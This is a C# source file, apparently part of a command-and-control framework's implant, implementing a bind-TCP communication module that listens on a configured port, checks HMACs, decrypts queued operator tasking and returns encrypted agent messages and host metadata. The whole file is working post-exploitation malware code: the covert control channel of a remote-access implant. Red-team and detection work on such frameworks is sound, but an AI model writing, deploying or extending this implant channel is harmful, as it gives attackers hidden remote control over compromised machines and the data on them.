using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Modules
{
    public class StateObject
    {
        public NetworkStream workStream = null;
        public const int BufferSize = 65535;
        public byte[] buffer = new byte[BufferSize];
        public byte[] tmpBuffer = null;
    }

    public class TcpCommModule : ICommModule
    {
        private ConfigController Config { get; set; }
        private CryptoController Crypto { get; set; }
        private TcpListener Listener { get; set; }
        public ModuleStatus ModuleStatus { get; set; }
        private Queue<AgentMessage> InboundC2Data { get; set; } = new Queue<AgentMessage>();
        private Queue<AgentMessage> OutboundC2Data { get; set; } = new Queue<AgentMessage>();

        private static ManualResetEvent AllDone = new ManualResetEvent(false);

        public ModuleStatus GetStatus()
        {
            return ModuleStatus;
        }

        public void Init(ConfigController config, CryptoController crypto)
        {
            ModuleStatus = ModuleStatus.Starting;
            Config = config;
            Crypto = crypto;

            Listener = new TcpListener(IPAddress.Parse((string)Config.GetOption(ConfigSetting.BindAddress)), (int)Config.GetOption(ConfigSetting.BindPort));
        }

        public bool RecvData(out AgentMessage message)
        {
            if (InboundC2Data.Count > 0)
            {
                message = InboundC2Data.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void SendData(AgentMessage message)
        {
            OutboundC2Data.Enqueue(message);
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            try
            {
                Listener.Start();

                Task.Factory.StartNew(delegate ()
                {
                    while (ModuleStatus == ModuleStatus.Running)
                    {
                        AllDone.Reset();
                        Listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), Listener);
                        AllDone.WaitOne();
                    }
                });
            }
            catch (Exception e)
            {
                throw new Exception(e.Message);
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            AllDone.Set();
            var listener = ar.AsyncState as TcpListener;

            if (ModuleStatus == ModuleStatus.Running)
            {
                var client = listener.EndAcceptTcpClient(ar);
                var stream = client.GetStream();
                var state = new StateObject { workStream = stream };
                stream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
            }
        }

        private void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as StateObject;
            var stream = state.workStream;
            var bytesRead = 0;

            try
            {
                bytesRead = stream.EndRead(ar);
            }
            catch { }

            if (bytesRead > 0)
            {
                var dataReceived = state.buffer.TrimBytes();

                if (bytesRead == state.buffer.Length)
                {
                    if (state.tmpBuffer != null)
                    {
                        var tmp = state.tmpBuffer;
                        state.tmpBuffer = new byte[tmp.Length + dataReceived.Length];
                        Buffer.BlockCopy(tmp, 0, state.tmpBuffer, 0, tmp.Length);
                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, tmp.Length, dataReceived.Length);
                    }
                    else
                    {
                        state.tmpBuffer = new byte[dataReceived.Length];
                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, 0, dataReceived.Length);
                    }

                    Array.Clear(state.buffer, 0, state.buffer.Length);
                    stream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
                }
                else
                {
                    byte[] final;
                    if (state.tmpBuffer != null)
                    {
                        final = new byte[state.tmpBuffer.Length + dataReceived.Length];
                        Buffer.BlockCopy(state.tmpBuffer, 0, final, 0, state.tmpBuffer.Length);
                        Buffer.BlockCopy(dataReceived, 0, final, state.tmpBuffer.Length, dataReceived.Length);
                    }
                    else
                    {
                        final = new byte[dataReceived.Length];
                        Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
                    }

                    var finalData = final.TrimBytes();

                    if (Crypto.VerifyHMAC(finalData))
                    {
                        var inbound = Crypto.Decrypt<List<AgentMessage>>(finalData);

                        if (inbound.Count > 0)
                        {
                            foreach (var dataIn in inbound)
                            {
                                InboundC2Data.Enqueue(dataIn);
                            }
                        }
                    }

                    var outbound = new List<AgentMessage>();

                    if (OutboundC2Data.Count > 0)
                    {
                        while (OutboundC2Data.Count != 0)
                        {
                            outbound.Add(OutboundC2Data.Dequeue());
                        }
                    }
                    else
                    {
                        outbound.Add(new AgentMessage
                        {
                            IdempotencyKey = Guid.NewGuid().ToString(),
                            Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                            Data = new C2Data()
                        });
                    }

                    var dataToSend = Crypto.Encrypt(outbound);
                    stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(SendCallback), stream);
                }
            }
        }

        private void SendCallback(IAsyncResult ar)
        {
            var stream = ar.AsyncState as NetworkStream;
            stream.EndWrite(ar);
            stream.Close();
        }

        public void Stop()
        {
            Listener.Stop();
            ModuleStatus = ModuleStatus.Stopped;
        }
    }
}